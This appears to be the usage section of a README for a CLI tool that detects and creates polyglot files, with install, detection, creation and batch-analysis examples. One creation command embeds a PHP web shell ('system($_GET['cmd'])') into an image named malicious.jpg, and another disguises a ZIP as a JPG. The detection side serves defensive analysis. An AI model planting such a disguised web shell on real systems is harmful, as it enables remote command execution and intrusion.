## Usage Examples

1. **Install the tool:**
```bash
chmod +x install_polyglot.sh
./install_polyglot.sh
```

2. **Detect file types:**
```bash
polyglot detect suspicious_file.bin
polyglot detect --json file1.jpg file2.zip
```

3. **Create polyglot files:**
```bash
# Simple polyglot
polyglot create -o polyglot_file -c jpg zip pdf

# With custom content
polyglot create -o malicious.jpg -c jpg php --content "<?php system($_GET['cmd']); ?>"

# ZIP polyglot
polyglot create-zip -o hidden.jpg -f document.txt -d jpg
```

4. **Batch analysis:**
```bash
# Analyze all files in directory
polyglot detect downloads/*

# Output to JSON for processing
polyglot detect --json suspicious_files/* > analysis.json
```

## Features

- **Multi-format Detection**: Uses magic numbers, file command, and MIME types
- **Polyglot Scoring**: Calculates how many file types a file could be
- **Suspicious Pattern Detection**: Finds embedded scripts and multiple headers
- **Flexible Creation**: Supports various polyglot combinations
- **ZIP Polyglots**: Create ZIP files disguised as other formats
- **JSON Output**: Machine-readable output for automation
- **Metadata Embedding**: Add custom metadata to polyglot files
- **Cross-platform**: Works on Linux, macOS, and Windows (with WSL)

## Security Notes

- This tool should only be used for legitimate security testing and research
- Always obtain proper authorization before testing files
- Polyglot files can be used maliciously - use responsibly
- The tool includes warnings for suspicious patterns to help identify potential threats

The tool provides comprehensive polyglot file analysis and creation capabilities with a user-friendly CLI interface.